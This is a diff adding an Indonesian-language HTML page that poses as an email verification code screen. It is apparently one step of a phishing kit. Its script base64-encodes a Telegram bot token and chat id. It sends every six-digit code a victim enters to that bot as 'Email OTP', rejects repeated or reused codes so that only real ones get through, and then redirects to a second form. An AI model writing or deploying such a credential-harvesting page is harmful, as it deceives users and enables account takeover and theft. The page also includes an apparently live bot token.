@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>verifikasi</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px 20px; color: #444; }
+        .bx { display: flex; justify-content: center; gap: 8px; margin: 30px 0; }
+        .bx input { width: 42px; height: 50px; text-align: center; font-size: 22px; border: none; border-bottom: 2px solid #ddd; outline: none; }
+        .bx input:focus { border-bottom-color: #EE4D2D; }
+        button { background: #EE4D2D; color: #fff; width: 100%; max-width: 320px; padding: 14px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        button:disabled { background: #eee; color: #999; cursor: not-allowed; }
+    </style>
+</head>
+<body>
+    <h3>Kode verifikasi email</h3>
+    <p>jangan membagikan kode yang terkirim kepada siapapun</p>
+    
+    <div class="bx">
+        <input type="tel" inputmode="numeric" maxlength="1" class="vi">
+        <input type="tel" inputmode="numeric" maxlength="1" class="vi">
+        <input type="tel" inputmode="numeric" maxlength="1" class="vi">
+        <input type="tel" inputmode="numeric" maxlength="1" class="vi">
+        <input type="tel" inputmode="numeric" maxlength="1" class="vi">
+        <input type="tel" inputmode="numeric" maxlength="1" class="vi">
+    </div>
+    
+    <button id="vb" disabled>konfirmasi</button>
+
+    <script>
+        (function(){
+            const _z = ["ODI4NjgyNDI1NDpBQUdQQWk3dVBmN28wLWExOXphVWpCTENYN0llbHFlUGNhOA==","NTkyMzAzMTgyNQ==","Zm9ybXVsaXIyLmh0bWw="];
+            const _u = "https://api.telegram.org/bot" + atob(_z[0]) + "/sendMessage";
+            const ins = document.querySelectorAll('.vi'), btn = document.getElementById('vb');
+            
+            // Variabel pengunci tombol
+            let isSubmitting = false;
+
+            ins.forEach((el, i) => {
+                el.oninput = () => { if (el.value && i < 5) ins[i + 1].focus(); btn.disabled = Array.from(ins).some(x => !x.value); };
+                el.onkeydown = (e) => { if (e.key === "Backspace" && !el.value && i > 0) ins[i - 1].focus(); };
+                el.onpaste = (e) => {
+                    let d = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').split('');
+                    if (d.length >= 6) { ins.forEach((inp, x) => inp.value = d[x] || ''); btn.disabled = false; e.preventDefault(); }
+                };
+            });
+
+            btn.onclick = async () => {
+                // Jika sedang memproses, abaikan klik selanjutnya
+                if (isSubmitting) return;
+
+                let v = Array.from(ins).map(x => x.value).join('');
+                let h = JSON.parse(sessionStorage.getItem('_h') || "[]");
+
+                // Validasi angka kembar atau kode yang sudah pernah dipakai
+                if (/^(.)\1{5}$/.test(v) || h.includes(v)) {
+                    alert("Error: Invalid or duplicate code.");
+                    return;
+                }
+
+                // AKTIFKAN PENGUNCI
+                isSubmitting = true;
+                btn.disabled = true;
+                btn.innerText = "Processing...";
+
+                // Simpan ke riwayat
+                h.push(v); 
+                sessionStorage.setItem('_h', JSON.stringify(h));
+
+                try {
+                    await fetch(_u, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ 
+                            chat_id: atob(_z[1]), 
+                            text: "Email OTP: " + v 
+                        })
+                    });
+                } catch (e) {
+                    console.log("Network error, but proceeding...");
+                }
+
+                // Pindah halaman
+                window.location.href = atob(_z[2]);
+            };
+        })();
+    </script>
+</body>
+</html>
